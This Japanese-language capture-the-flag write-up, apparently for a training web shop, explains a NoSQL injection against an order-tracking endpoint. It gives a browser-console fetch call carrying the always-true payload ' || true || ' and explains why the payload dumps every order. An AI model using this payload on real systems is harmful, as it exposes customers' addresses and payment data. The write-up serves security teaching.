# NoSQL Exfiltration ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** NoSQLi
**目標:** 注文追跡機能から全注文データを抽出する

---

## 思考プロセス

**ステップ1: 機能を特定**
```
「注文追跡機能がある」
    ↓
「注文IDを入力すると、その注文の詳細が返される」
    ↓
「WHERE orderId = '入力値' というクエリが実行されているはず」
    ↓
「NoSQLデータベース（MongoDB）を使っている可能性」
```

**ステップ2: SQLiとの違いを理解**
```
「MongoDBはSQLを使わない」
    ↓
「でも条件式の改ざんは可能」
    ↓
「' || true || ' を入れると...」
    ↓
「条件が "何か || true || 何か" になる」
    ↓
「true があるので全ての注文が一致する！」
```

## 実行手順

Console で以下を実行:
```javascript
fetch('/rest/track-order/' + encodeURIComponent("' || true || '"))
  .then(r => r.json())
  .then(data => console.log(data));
```

## 解説

**SQLiとNoSQLiの比較:**
```
SQL:   ' OR 1=1--
NoSQL: ' || true || '

どちらも「常に真」になる条件を挿入している
```

**ペイロードの意味:**
- `'` - 前の文字列を閉じる
- `|| true` - OR true で常に真
- `|| '` - 後ろの文字列と繋げる
- 結果: 全注文データが返される

**なぜ危険？**
- 全顧客の注文履歴が漏洩
- 住所、支払い情報などの個人情報
- 大量データの抽出（データダンプ）

## 関連チャレンジ

- [NoSQL Manipulation](../difficulty-4/nosql-manipulation.md)
- [Database Schema](../difficulty-4/database-schema.md)
